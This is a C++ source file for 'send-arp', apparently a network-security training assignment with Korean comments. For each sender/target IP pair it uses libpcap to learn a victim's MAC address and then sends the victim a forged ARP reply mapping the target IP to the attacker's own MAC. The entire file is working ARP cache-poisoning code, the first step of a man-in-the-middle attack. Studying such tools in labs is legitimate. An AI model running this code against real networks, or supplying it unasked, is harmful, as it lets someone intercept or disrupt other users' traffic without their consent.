#include <cstdio>
#include "arp.h"

void usage(){
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc >= 4 && argc % 2 == 1)) {
		usage();
		return -1;
	}

	char* interface = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	Mac my_macaddr = my_mac(interface);
	Ip my_ipaddr = my_ip(interface);
	
	for(int i = 2; i < argc; i += 2){	
		char* sender_ip = argv[i];
		char* target_ip = argv[i + 1];
		printf("[*] send : %s target : %s\n", sender_ip, target_ip);
		
		pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
			return -1;
		}
		//victim mac 알아내기 request
		send_arp(handle,Mac(MAC_BROADCAST),my_macaddr,ArpHdr::Request,my_macaddr,my_ipaddr,Mac(MAC_NULL),Ip(sender_ip));
		EthArpPacket packet = recv_arp(handle,Ip(sender_ip));

		//victim에게 reply 보내기
		send_arp(handle,Mac(packet.arp_.smac_),my_macaddr,ArpHdr::Reply,my_macaddr,Ip(target_ip),Mac(packet.arp_.smac_),Ip(sender_ip));

		printf("\t[*] sender mac : %s\n",std::string(packet.arp_.smac_).c_str());

		pcap_close(handle);
		printf("[*] success!\n");
	}

}
